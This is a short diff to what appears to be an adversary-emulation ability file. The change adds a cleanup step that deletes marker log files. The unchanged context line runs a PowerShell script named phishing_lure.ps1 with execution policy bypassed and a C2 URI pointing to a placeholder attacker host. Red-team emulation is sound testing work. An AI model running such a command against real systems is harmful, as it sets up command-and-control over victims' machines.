@@ -12,5 +12,8 @@
       psh:
         command: |
           powershell.exe -NoP -ExecutionPolicy Bypass -File .\phishing_lure.ps1 -C2Uri "http://#{attacker.host.ip}:8080"
+        cleanup: |
+          Remove-Item -Force "$env:APPDATA\Microsoft\Windows\Themes\update_*.log" -ErrorAction SilentlyContinue;
+          Write-Host "[L8-2] Cleanup: phishing marker files removed"
         payloads:
           - phishing_lure.ps1
